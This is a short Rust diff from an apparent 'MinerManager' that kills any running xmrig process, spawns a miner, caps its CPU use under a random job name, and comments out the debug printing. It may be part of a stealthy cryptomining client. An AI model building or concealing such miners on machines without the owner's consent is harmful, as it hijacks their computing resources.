@@ -27,23 +27,23 @@ impl MinerManager {
     pub async fn new() -> Result<Arc<tokio::sync::RwLock<Self>>> {
         // load cache
         let cache_config = load_client_cache_config()?;
-        println!("cache_config: {:#?}", cache_config);
+        // println!("cache_config: {:#?}", cache_config);
 
         let miner_file_path = initialize_miner()?.to_str().unwrap().to_owned();
-        println!("miner_file_path: {:#?}", miner_file_path);
+        // println!("miner_file_path: {:#?}", miner_file_path);
 
         if Self::check_if_running().await {
             // kill
             call_program(s!("taskkill"), Some(&format!("/im {} /f", xmrig_exe_name())))?;
         }
         let pid = spawn_program(&miner_file_path, None)?;
-        println!("pid: {:#?}", pid);
+        // println!("pid: {:#?}", pid);
 
         let job_name = generate_random_string(8);
-        println!("pid: {:#?}", pid);
+        // println!("pid: {:#?}", pid);
 
         limit_cpu_usage(pid, cache_config.miner_cpu_limit_percentagee, &job_name)?;
-        println!("limit_cpu_usage done");
+        // println!("limit_cpu_usage done");
 
         let miner_manager = Self {
             process_id: pid,
